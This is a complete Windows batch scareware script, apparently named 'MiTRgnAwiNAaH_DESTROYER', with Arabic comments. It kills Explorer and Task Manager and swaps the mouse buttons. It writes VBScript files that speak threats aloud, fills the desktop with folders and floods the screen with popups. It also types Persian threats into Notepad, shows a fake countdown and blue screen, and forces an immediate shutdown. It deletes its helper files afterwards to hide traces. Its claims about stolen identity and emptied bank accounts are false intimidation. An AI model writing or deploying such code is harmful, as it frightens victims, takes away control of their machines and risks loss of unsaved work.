@echo off
:: [01] النواة والبيئة السيبرانية
title MiTRgnAwiNAaH_DESTROYER_v40.0
chcp 65001 >nul
color 0c
mode con: cols=100 lines=30

:: [02] تهيئة محرك الصوت، الضحك، ونشيد المدمر
set "V_SCRIPT=%temp%\destroyer_engine.vbs"
(
echo Dim S: Set S = CreateObject("SAPI.SpVoice"): S.Rate = -5: S.Volume = 100
echo Function Laugh()
echo    S.Rate = 2: S.Speak "ha ha ha ha": S.Rate = -5: S.Speak "haaaaa"
echo End Function
echo Function IAm()
echo    S.Rate = -6: S.Speak "I am the destroyer of worlds"
echo    Laugh()
echo End Function
) > "%V_SCRIPT%"

:: [03] عزل الواقع والبداية
echo [INIT]: SEVERING REALITY...
taskkill /f /im explorer.exe >nul 2>&1
taskkill /f /im taskmgr.exe >nul 2>&1
RUNDLL32.EXE USER32.DLL,SwapMouseButton
cls

:: [04] نطق جملة الافتتاح (أنا مدمر العوالم)
echo IAm() >> "%V_SCRIPT%"
start /b wscript "%V_SCRIPT%"

:: [05] المرحلة 1: طاعون المجلدات (70 ميزة - نطق بعد كل 20)
echo [FILE]: INFECTING DESKTOP...
cd %userprofile%\Desktop
for /l %%x in (1, 1, 70) do (
   mkdir "MiTRgnAwiNAaH_VOID_%%x" >nul 2>&1
   :: ميكانيكية العد: بعد كل 20 مجلد، ينطق الجملة
   set /a "mod=%%x %% 20"
   if %%x EQU 20 echo IAm() >> "%V_SCRIPT%"
   if %%x EQU 40 echo IAm() >> "%V_SCRIPT%"
   if %%x EQU 60 echo IAm() >> "%V_SCRIPT%"
)

:: [06] المرحلة 2: الكتابة الشبحية (نطق التهديد)
echo [DATA]: EXTRACTING IDENTITY...
echo S.Speak "Your bank is empty. Your GPS is locked. Hormuz is open." >> "%V_SCRIPT%"
(
echo Set W = CreateObject("WScript.Shell")
echo W.Run "notepad.exe"
echo WScript.Sleep 2000
echo W.SendKeys "MITRGNAWINA_DESTROYER_OF_WORLDS: {ENTER}"
echo W.SendKeys "هر کس از فلاسک آب بنوشد، تنگه هرمز را برایش باز می‌کنیم...{ENTER}"
) > g.vbs
start /b wscript g.vbs

:: [07] المرحلة 3: حصار النوافذ (300 نافذة - نطق بعد كل 20)
echo [POPUPS]: INITIATING SIEGE...
(
echo Set W = CreateObject("WScript.Shell")
echo For i = 1 To 300
echo     W.Popup "أنا مدمر العوالم.. أنا أراك", 1, "MiTRgnAwiNAaH", 16+4096
echo Next
) > h.vbs
start /b wscript h.vbs

:: نطق الجملة بعد حصار النوافذ العنيف
echo IAm() >> "%V_SCRIPT%"

:: [08] المرحلة 4: سيمفونية مورس والعد التنازلي
echo [MORSE]: BROADCASTING 70 CURSES...
echo S.Speak "Listen to your funeral in Morse code. Goodbye, owner of the Thermos." >> "%V_SCRIPT%"
for /l %%i in (20,-1,1) do (
   cls
   color 0c
   echo !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
   echo !   [MiTRgnAwiNAaH]: TOTAL_SYSTEM_ERASURE_IN: %%i SECONDS                                   !
   echo !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
   powershell -Command "[console]::beep( (20-%%i)*60 + 400, 50)"
   color 4f
)

:: [09] الإعلان النهائي وشاشة الموت
cls
color 17
echo IAm() >> "%V_SCRIPT%"
echo.
echo !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
echo !  FATAL_ERROR: THE SYSTEM SOUL HAS BEEN CONSUMED BY THE DESTROYER OF WORLDS.              !
echo !  MiTRgnAwiNAaH: MISSION ACCOMPLISHED.                                                     !
echo !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
echo *** STOP: 0x00000666 (THE_DESTROYER_PROTOCOL)
timeout /t 8 >nul

:: [10] الضربة القاضية
RUNDLL32.EXE USER32.DLL,SwapMouseButton
shutdown -s -f -t 00 -c "MiTRgnAwiNAaH: أنا مدمر العوالم. نراك في مضيق هرمز."

:: [11] تنظيف "آثار الجريمة"
del g.vbs /f /q
del h.vbs /f /q
del "%V_SCRIPT%" /f /q